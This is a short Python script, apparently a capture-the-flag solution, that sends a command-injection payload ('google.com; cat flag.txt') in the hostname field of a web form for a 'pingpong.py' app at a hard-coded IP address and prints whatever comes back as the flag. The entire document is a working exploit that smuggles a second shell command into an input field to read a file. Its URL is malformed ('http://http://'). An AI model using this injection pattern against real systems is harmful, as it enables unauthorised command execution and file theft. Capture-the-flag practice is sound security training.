import requests

# Replace this URL with the URL of your server running the "pingpong.py" app
base_url = "http://http://34.130.180.82:53523/"

# Step 1: Craft the payload for command injection
payload = "google.com; cat flag.txt"

# Step 2: Submit the payload in the hostname field
data = {
    'hostname': payload
}

response = requests.post(base_url, data=data)

# Step 3: Extract the flag from the response
flag = response.text.strip()

print("Flag:", flag)
